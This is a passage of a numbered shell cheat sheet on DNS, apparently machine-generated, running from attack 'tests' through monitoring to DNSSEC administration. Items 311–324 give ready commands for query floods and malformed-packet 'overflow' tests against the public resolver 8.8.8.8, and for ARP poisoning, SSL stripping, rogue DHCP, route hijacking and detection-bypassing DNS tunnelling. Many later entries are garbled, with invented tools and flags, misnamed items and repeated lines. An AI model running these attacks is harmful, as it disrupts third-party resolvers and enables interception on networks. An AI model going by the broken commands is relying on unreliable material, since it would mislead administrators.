dig @8.8.8.8 $(python3 -c "print('a'*253+'.example.com')")

# 311. DNS query with malformed packet test
echo -ne "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" | nc -u 8.8.8.8 53

# 312. DNS query with buffer overflow test
echo -ne "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"$(python3 -c "print('A'*4096)") | nc -u 8.8.8.8 53

# 313. DNS query with NXDOMAIN flood test
for i in {1..10000}; do dig @8.8.8.8 nonexistent$i.example.com +short & done

# 314. DNS query with random subdomain attack
while true; do dig @8.8.8.8 $(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n1).example.com +short; done

# 315. DNS query with query flood from multiple sources
for i in {1..10}; do (for j in {1..100}; do dig @8.8.8.8 attack$j.example.com +short; done) & done

# 316. DNS query with amplification reflection
dig @8.8.8.8 example.com ANY +bufsize=512 | nc -u -p 12345 192.168.1.1 53

# 317. DNS query with response replay attack
sudo tcpreplay -i eth0 --loop=100 --pps=100 dns_response.pcap

# 318. DNS query with man-in-the-middle test
arpspoof -i eth0 -t $TARGET $GATEWAY & dig @8.8.8.8 example.com

# 319. DNS query with SSL stripping
sslstrip -l 8080 & dig example.com @localhost -p 53

# 320. DNS query with BGP hijack simulation
birdc "protocol bgp { neighbor 192.168.1.1 as 65000; prefix 8.8.8.0/24; }"

# 321. DNS query with routing hijack
ip route replace 8.8.8.0/24 via 192.168.1.1 && dig @8.8.8.8 example.com

# 322. DNS query with ARP poisoning
ettercap -T -q -M arp:remote /$TARGET/ /$GATEWAY/ && dig @8.8.8.8 example.com

# 323. DNS query with DHCP rogue server
dhcpd -cf /etc/dhcp/dhcpd.conf eth0 && dig @192.168.1.1 example.com

# 324. DNS query with IPv6 router advertisement spoof
radvd -C /etc/radvd.conf && dig @fe80::1%eth0 example.com

# 325. DNS query with tunneling detection bypass
iodine -f -P password -m 1000 -T 60 tunnel.example.com

# 326. DNS query with custom packet crafting
scapy -c "send(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='example.com')))"

# 327. DNS query with DNS proxy chain
dig @proxy1.dns -p 5353 example.com && dig @proxy2.dns -p 5353 example.com

# 328. DNS query with onion routing
torsocks dig @8.8.8.8 example.com

# 329. DNS query with I2P routing
i2prouter start && dig @localhost -p 53 example.com

# 330. DNS query with Freenet routing
freenet start && dig @localhost -p 53 example.com

# 331. DNS query with ZeroNet
zeronet start && dig @localhost -p 53 example.com

# 332. DNS query with IPFS gateway
curl -s "https://dns.google/resolve?name=example.com" | jq .

# 333. DNS query with blockchain DNS
dig @dns.eth.link example.com

# 334. DNS query with Handshake DNS
hnsd -d && dig @localhost -p 53 example.com

# 335. DNS query with namecoin
namecoind && dig @localhost -p 53 example.com

# 336. DNS query with ENS resolution
curl -s "https://cloudflare-eth.com/v1/mainnet/ens/resolve/example.eth"

# 337. DNS query with Unstoppable Domains
dig @zns.dnp.ninja example.com

# 338. DNS query with DNS-over-Namecoin
dig @192.168.1.1 -p 5353 example.com

# 339. DNS query with DNS-over-Blockchain
dig @dns.blockchain example.com

# 340. DNS query with OpenNIC
dig @94.247.43.254 example.com

# 341. DNS query with Yggdrasil
dig @[200:200:200:200:200:200:200:1] example.com

# 342. DNS query with CJDNS
dig @fc00::1 example.com

# 343. DNS query with GNUnet
gnunet-dns -c /etc/gnunet.conf && dig @127.0.0.1 -p 5353 example.com

# 344. DNS query with Tor onion service
dig @dns4torpnlfs2ifuz2s2yf3fc7rdmsbhm6y75iykinbgs4g7bhe5x6d.onion example.com

# 345. DNS query with I2P eepsite
dig @i2p dns example.com

# 346. DNS query with Lokinet
lokinet -d && dig @127.0.0.1 -p 5353 example.com

# 347. DNS query with NKN
nknd && dig @127.0.0.1 -p 5353 example.com

# 348. DNS query with Kad network
dig @127.0.0.1 -p 5353 example.com

# 349. DNS query with DHT network
dig @127.0.0.1 -p 5353 example.com

# 350. DNS query with P2P DNS
dig @127.0.0.1 -p 5353 example.com

## === Monitoring & Logging (351-400) ===

# 351. DNS query with systemd journal monitoring
sudo journalctl -u systemd-resolved -f

# 352. DNS query with syslog monitoring
sudo tail -f /var/log/syslog | grep -E "DNS|dns|named|unbound"

# 353. DNS query with auditd monitoring
sudo auditctl -w /etc/resolv.conf -p wa -k dns_change

# 354. DNS query with inotify monitoring
inotifywait -m /etc/resolv.conf

# 355. DNS query with prometheus monitoring
node_exporter --collector.dns

# 356. DNS query with Grafana dashboards
curl -X POST -H "Content-Type: application/json" -d '{"query":"dns_query_count"}' http://localhost:3000/api/query

# 357. DNS query with ELK stack
filebeat -e -c filebeat.yml

# 358. DNS query with Graylog
gelf-client -H graylog-server -p 12201 -m "DNS query: example.com"

# 359. DNS query with Splunk
splunk add monitor /var/log/dns.log

# 360. DNS query with rsyslog forwarding
echo "*.* @@dns-logger:514" >> /etc/rsyslog.conf && systemctl restart rsyslog

# 361. DNS query with logrotate configuration
echo "/var/log/dns.log { daily; rotate 7; compress; delaycompress; missingok; notifempty; create 0640 bind bind; }" >> /etc/logrotate.d/dns

# 362. DNS query with performance monitoring
dstat -c -d -n -m -p --top-cpu

# 363. DNS query with network monitoring
iftop -i eth0 -f "port 53"

# 364. DNS query with bandwidth monitoring
nethogs -d 2 eth0

# 365. DNS query with connection tracking
conntrack -L -p udp --dport 53

# 366. DNS query with flow monitoring
flowd -i eth0 -p 2055

# 367. DNS query with sFlow monitoring
sflow -i eth0 -p 6343

# 368. DNS query with NetFlow export
nfcapd -r -z -w -p 2055

# 369. DNS query with IPFIX export
ipfix -i eth0 -p 4739

# 370. DNS query with DNS statistics collection
rndc stats && cat /var/cache/bind/named.stats

# 371. DNS query with query logging enable
rndc querylog on

# 372. DNS query with query logging disable
rndc querylog off

# 373. DNS query with zone statistics
rndc zonestatus example.com

# 374. DNS query with flush cache
rndc flush

# 375. DNS query with flush specific domain
rndc flushname example.com

# 376. DNS query with freeze zone
rndc freeze example.com

# 377. DNS query with thaw zone
rndc thaw example.com

# 378. DNS query with reload zone
rndc reload example.com

# 379. DNS query with retransfer zone
rndc retransfer example.com

# 380. DNS query with signing zone
rndc signing -list example.com

# 381. DNS query with DNSSEC maintenance
rndc signing -clear example.com

# 382. DNS query with zone secure
rndc secure example.com

# 383. DNS query with TSIG key management
tsig-keygen -a hmac-sha256 example.com

# 384. DNS query with DNSSEC key management
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com

# 385. DNS query with DNSSEC key rollover
dnssec-settime -I +30d example.com

# 386. DNS query with DNSSEC key deletion
dnssec-keygen -D +30d example.com

# 387. DNS query with DNSSEC key publish
dnssec-keygen -P +1d example.com

# 388. DNS query with DNSSEC key activation
dnssec-keygen -A +1d example.com

# 389. DNS query with DNSSEC key deactivation
dnssec-keygen -I +30d example.com

# 390. DNS query with DNSSEC key removal
dnssec-keygen -D +30d example.com

# 391. DNS query with DNSSEC key listing
dnssec-keygen -l example.com

# 392. DNS query with DNSSEC key import
dnssec-keygen -i Kexample.com.+157+12345.private

# 393. DNS query with DNSSEC key export
dnssec-keygen -e Kexample.com.+157+12345

# 394. DNS query with DNSSEC key revocation
dnssec-revoke Kexample.com.+157+12345

# 395. DNS query with DNSSEC verification
dnssec-verify -o example.com db.example.com

# 396. DNS query with DNSSEC signing
dnssec-signzone -N NSEC3 -R -S -K /etc/bind/keys -o example.com db.example.com

# 397. DNS query with DNSSEC zone re-sign
dnssec-signzone -N NSEC3 -R -S -K /etc/bind/keys -o example.com -t db.example.com

# 398. DNS query with DNSSEC zone clean
dnssec-clean -R example.com

# 399. DNS query with DNSSEC zone check
dnssec-checkzone -o example.com db.example.com

# 400. DNS query with complete DNSSEC zone maintenance
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com && dnssec-signzone -N NSEC3 -R -S -K /etc/bind/keys -o example.com db.example.com && rndc reload example.com
